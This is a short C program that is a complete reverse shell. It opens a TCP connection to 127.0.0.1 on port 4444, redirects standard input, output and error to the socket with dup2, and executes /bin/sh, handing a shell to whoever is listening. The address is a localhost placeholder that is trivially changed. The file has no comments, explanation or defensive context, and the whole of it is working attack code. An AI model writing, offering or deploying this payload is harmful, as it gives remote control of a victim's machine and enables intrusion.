#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define IP "127.0.0.1"
#define PORT 4444

int main(void) {
    int fd;
    struct sockaddr_in server;
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    connect(fd, (struct sockaddr *)&server, sizeof(server));
    
    for (int i = 0; i < 3; i++) {
        dup2(fd, i);
    }
    
    execve("/bin/sh", NULL, NULL);
    EXIT_SUCCESS;
}